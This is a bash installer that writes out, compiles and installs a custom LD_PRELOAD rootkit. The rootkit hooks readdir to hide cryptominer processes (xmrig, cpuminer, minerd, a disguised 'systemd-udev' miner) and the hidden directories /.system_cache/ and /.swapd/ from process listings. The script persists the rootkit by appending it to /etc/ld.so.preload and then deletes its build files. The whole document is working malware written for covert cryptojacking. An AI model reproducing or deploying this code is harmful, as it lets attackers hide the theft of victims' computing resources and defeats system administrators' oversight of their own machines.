#!/bin/bash

# ====================================================================
# CUSTOM LIBPROCESSHIDER INSTALLER
# ====================================================================
# Hides multiple processes including user-level systemd-udev
#
# Processes hidden:
# - swapd (root miner)
# - xmrig
# - system-watchdog
# - systemd-udev (your user-level miner)
# - cpuminer
# - minerd
#
# Paths hidden:
# - Anything in /.system_cache/ directory
# - Anything in /.swapd/ directory
# ====================================================================

echo "[*] Installing custom multi-process libprocesshider..."

# Install build dependencies
echo "[*] Installing dependencies..."
if command -v apt-get >/dev/null 2>&1; then
    apt-get update -qq
    apt-get install -y gcc make >/dev/null 2>&1
elif command -v yum >/dev/null 2>&1; then
    yum install -y gcc make >/dev/null 2>&1
elif command -v apk >/dev/null 2>&1; then
    apk add gcc make musl-dev >/dev/null 2>&1
fi

# Create temp directory
cd /tmp
rm -rf libprocesshider_custom 2>/dev/null
mkdir -p libprocesshider_custom
cd libprocesshider_custom

# Create the custom processhider.c
cat > processhider.c << 'EOF'
#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

// List of process names to hide
static const char* process_to_filter[] = {
    "swapd",
    "xmrig",
    "system-watchdog",
    "systemd-udev",      // User-level miner
    ".systemd-udev",     // Hidden file version
    "cpuminer",
    "minerd",
    NULL
};

// Paths to check for hidden processes
static const char* paths_to_filter[] = {
    "/.system_cache/",
    "/.swapd/",
    NULL
};

static const char* get_dir_name(DIR* dirp) {
    int fd = dirfd(dirp);
    if (fd == -1) return NULL;
    
    static char path_buf[4096];
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
    
    ssize_t len = readlink(fd_path, path_buf, sizeof(path_buf) - 1);
    if (len == -1) return NULL;
    
    path_buf[len] = '\0';
    return path_buf;
}

static char* get_process_name(char* pid) {
    char stat_path[256];
    snprintf(stat_path, sizeof(stat_path), "/proc/%s/stat", pid);
    
    FILE* f = fopen(stat_path, "r");
    if (!f) return NULL;
    
    static char name_buf[256];
    if (fscanf(f, "%*d (%255[^)])", name_buf) != 1) {
        fclose(f);
        return NULL;
    }
    
    fclose(f);
    return name_buf;
}

static char* get_process_cmdline(char* pid) {
    char cmdline_path[256];
    snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", pid);
    
    FILE* f = fopen(cmdline_path, "r");
    if (!f) return NULL;
    
    static char cmdline_buf[4096];
    size_t len = fread(cmdline_buf, 1, sizeof(cmdline_buf) - 1, f);
    fclose(f);
    
    if (len == 0) return NULL;
    
    cmdline_buf[len] = '\0';
    for (size_t i = 0; i < len; i++) {
        if (cmdline_buf[i] == '\0') cmdline_buf[i] = ' ';
    }
    
    return cmdline_buf;
}

static int should_hide_process(const char* name) {
    for (int i = 0; process_to_filter[i] != NULL; i++) {
        if (strcmp(name, process_to_filter[i]) == 0) {
            return 1;
        }
    }
    
    for (int i = 0; paths_to_filter[i] != NULL; i++) {
        if (strstr(name, paths_to_filter[i]) != NULL) {
            return 1;
        }
    }
    
    return 0;
}

struct dirent* readdir(DIR* dirp) {
    struct dirent* (*original_readdir)(DIR*);
    original_readdir = dlsym(RTLD_NEXT, "readdir");
    
    struct dirent* dir;
    
    while (1) {
        dir = original_readdir(dirp);
        if (dir == NULL) return NULL;
        
        const char* dir_name = get_dir_name(dirp);
        if (dir_name == NULL || strcmp(dir_name, "/proc") != 0) {
            return dir;
        }
        
        int is_pid = 1;
        for (int i = 0; dir->d_name[i]; i++) {
            if (dir->d_name[i] < '0' || dir->d_name[i] > '9') {
                is_pid = 0;
                break;
            }
        }
        
        if (!is_pid) return dir;
        
        char* process_name = get_process_name(dir->d_name);
        if (process_name == NULL) return dir;
        
        if (should_hide_process(process_name)) {
            continue;
        }
        
        char* cmdline = get_process_cmdline(dir->d_name);
        if (cmdline != NULL && should_hide_process(cmdline)) {
            continue;
        }
        
        return dir;
    }
}
EOF

echo "[*] Compiling custom processhider..."
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

if [ ! -f libprocesshider.so ]; then
    echo "[!] Compilation failed!"
    exit 1
fi

echo "[✓] Compiled successfully"

# Install the library
echo "[*] Installing library..."
mkdir -p /usr/local/lib
cp libprocesshider.so /usr/local/lib/

# Add to ld.so.preload
echo "[*] Adding to /etc/ld.so.preload..."
if ! grep -q "/usr/local/lib/libprocesshider.so" /etc/ld.so.preload 2>/dev/null; then
    echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
    echo "[✓] Added to /etc/ld.so.preload"
else
    echo "[*] Already in /etc/ld.so.preload"
fi

# Cleanup
cd /tmp
rm -rf libprocesshider_custom

echo ""
echo "[✓] Custom libprocesshider installed successfully!"
echo ""
echo "Hidden processes:"
echo "  - swapd"
echo "  - xmrig"
echo "  - system-watchdog"
echo "  - systemd-udev (your user-level miner)"
echo "  - cpuminer"
echo "  - minerd"
echo ""
echo "Hidden paths:"
echo "  - /.system_cache/*"
echo "  - /.swapd/*"
echo ""
echo "Test with:"
echo "  ps aux | grep systemd-udev"
echo "  (should NOT show /home/*/. system_cache/.systemd-udev)"
echo ""
